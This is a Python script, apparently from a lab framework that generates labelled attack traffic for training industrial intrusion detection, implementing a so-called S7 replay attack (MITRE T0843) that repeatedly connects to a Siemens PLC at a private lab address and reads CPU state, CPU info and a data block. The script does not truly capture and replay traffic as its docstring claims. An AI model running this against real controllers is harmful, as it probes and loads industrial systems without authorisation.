"""
S7_REPLAY_ATTACK
Kỹ thuật: Capture S7 session hợp lệ → replay lại với src IP attacker.
Khó detect bằng threshold-based IDS vì payload giống hệt legitimate.
MITRE: T0843 — Program Replay

Gọi từ bash:
  python -m attacks_ext.s7_replay \
      --target 192.168.210.211 --rack 0 --slot 1 --duration 120 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import snap7
import time
from attacks_ext.config_ext import base_parser, write_label

PACKET_INTERVAL = 0.3


def run(args):
    label_prefix = "S7_REPLAY"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target}")

    replay_count = 0

    try:
        # Phase 1: Record legitimate operations first
        print("[PHASE 1] Recording legitimate S7 operations...")
        recorded = []

        c = snap7.client.Client()
        c.connect(args.target, args.rack, args.slot)
        recorded.append(("connect", None))
        recorded.append(("get_cpu_state", None))
        recorded.append(("get_cpu_info", None))
        c.disconnect()
        recorded.append(("disconnect", None))

        print(f"  Recorded {len(recorded)} operations")

        # Phase 2: Replay with attacker timing (faster = suspicious)
        print(f"[PHASE 2] Replaying operations from IP attacker...")
        end_time = time.time() + args.duration

        while time.time() < end_time:
            c = snap7.client.Client()
            try:
                c.connect(args.target, args.rack, args.slot)
                c.get_cpu_state()
                c.get_cpu_info()
                for _ in range(3):
                    try:
                        c.db_read(1, 0, 2)
                    except Exception:
                        pass
                c.disconnect()
                replay_count += 1
                if replay_count % 20 == 0:
                    print(f"  [{replay_count}] replay sessions sent")
            except Exception:
                try:
                    c.disconnect()
                except Exception:
                    pass
            time.sleep(PACKET_INTERVAL)

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"replay_sessions={replay_count}")


def main():
    p = base_parser("S7 Replay Attack (T0843)")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
